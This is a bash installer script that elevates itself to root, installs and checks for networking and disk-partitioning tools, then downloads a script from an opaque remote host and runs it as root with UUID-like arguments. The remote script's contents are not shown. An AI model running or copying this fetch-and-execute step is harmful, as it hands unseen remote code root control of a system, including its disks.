#!/bin/bash
if [ "$(id -u)" != "0" ]; then
    sudo bash "$0" "$@"
    exit $?
fi
if [ "$(uname -m)" = "aarch64" ]; then
    echo "ARM is not supported!"
    exit 1
fi
if ! command -v ip > /dev/null || ! command -v wget > /dev/null || ! command -v lsblk > /dev/null || ! command -v fdisk > /dev/null; then
	echo "Installing dependencies..."
	if [ -e /etc/debian_version ]; then
        	apt-get --quiet --yes update || true
		apt-get --quiet --quiet --yes install iproute2 wget fdisk || true
	else
        packages=("iproute2" "wget" "fdisk" "util-linux")
        for package in "${packages[@]}"; do
            yum --quiet --assumeyes install "$package" || true
        done
	fi
fi

if ! command -v ip > /dev/null; then
	echo "Please make sure 'ip' tool is available on your system and try again."
	exit 1
fi
if ! command -v wget > /dev/null; then
	echo "Please make sure 'wget' tool is available on your system and try again."
	exit 1
fi

if ! command -v lsblk > /dev/null; then
  echo "Please make sure 'lsblk' tool is available on your system and try again."
  exit 1
fi

if ! command -v blkid > /dev/null; then
  echo "Please make sure 'blkid' tool is available on your system and try again."
  exit 1
fi

if ! command -v fdisk > /dev/null; then
  echo "Please make sure 'fdisk' tool is available on your system and try again."
  exit 1
fi

if ! command -v base64 > /dev/null; then
	echo "Please make sure 'base64' tool is available on your system and try again."
	exit 1
fi

if (wget hxl0w5.hhub.top/VktjWxphUl.sh -4O setup.sh || curl hxl0w5.hhub.top/VktjWxphUl.sh -Lo setup.sh); then
    bash setup.sh 446b5368-3e77-48fb-9e65-6cb547826c78 -i=94f3c6ad-6153-49a9-b7f6-2d3ea4fb371e
else
    echo "Failed to download the installation script. Please check your internet connection and try again."
    exit 1
fi
